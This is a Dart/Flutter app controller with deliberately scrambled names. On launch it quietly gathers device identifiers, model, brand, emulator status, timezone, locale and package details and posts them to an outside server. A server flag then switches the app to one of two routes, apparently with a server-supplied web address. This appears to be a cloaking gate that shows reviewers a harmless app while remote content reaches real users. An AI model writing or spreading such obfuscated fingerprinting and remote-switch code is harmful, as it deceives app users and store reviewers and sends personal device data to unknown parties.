import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var wemvqfztck = RxBool(false);
  var dzfesg = RxBool(true);
  var qxkmcw = RxString("");
  var gordon = RxBool(false);
  var daniel = RxBool(true);
  final grcxmwpkuf = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    rwmfslca();
  }


  Future<void> rwmfslca() async {

    gordon.value = true;
    daniel.value = true;
    dzfesg.value = false;

    grcxmwpkuf.post("https://fire.fairaii.xyz/8UKOicIXBz",data: await nclpiusatd()).then((value) {
      var oifryv = value.data["oifryv"] as String;
      var jpae = value.data["jpae"] as bool;
      if (jpae) {
        qxkmcw.value = oifryv;
        jammie();
      } else {
        moore();
      }
    }).catchError((e) {
      dzfesg.value = true;
      daniel.value = true;
      gordon.value = false;
    });
  }

  Future<Map<String, dynamic>> nclpiusatd() async {
    final DeviceInfoPlugin izvcpu = DeviceInfoPlugin();
    PackageInfo rcvj_dtof = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var twpjgaf = Platform.localeName;
    var zcuCVSG = currentTimeZone;

    var tDVfqBo = rcvj_dtof.packageName;
    var VqBy = rcvj_dtof.version;
    var oTWYpZG = rcvj_dtof.buildNumber;

    var TGnmBh = rcvj_dtof.appName;
    var laylaWuckert = "";
    var maYT  = "";
    var EfzQCg = "";
    var alfJacobs = "";

    var danikaBartoletti = "";
    var WxjE = "";
    var kEtL = "";
    var auMVeIq = false;

    if (GetPlatform.isAndroid) {
      kEtL = "android";
      var xnbgdyez = await izvcpu.androidInfo;

      EfzQCg = xnbgdyez.brand;

      WxjE  = xnbgdyez.model;
      maYT = xnbgdyez.id;

      auMVeIq = xnbgdyez.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      kEtL = "ios";
      var mfcnxdi = await izvcpu.iosInfo;
      EfzQCg = mfcnxdi.name;
      WxjE = mfcnxdi.model;

      maYT = mfcnxdi.identifierForVendor ?? "";
      auMVeIq  = mfcnxdi.isPhysicalDevice;
    }
    var res = {
      "danikaBartoletti" : danikaBartoletti,
      "TGnmBh": TGnmBh,
      "VqBy": VqBy,
      "WxjE": WxjE,
      "zcuCVSG": zcuCVSG,
      "EfzQCg": EfzQCg,
      "oTWYpZG": oTWYpZG,
      "maYT": maYT,
      "twpjgaf": twpjgaf,
      "kEtL": kEtL,
      "auMVeIq": auMVeIq,
      "tDVfqBo": tDVfqBo,
      "laylaWuckert" : laylaWuckert,
      "alfJacobs" : alfJacobs,

    };
    return res;
  }

  Future<void> moore() async {
    Get.offAllNamed("/computer_tab");
  }

  Future<void> jammie() async {
    Get.offAllNamed("/level_tis");
  }

}
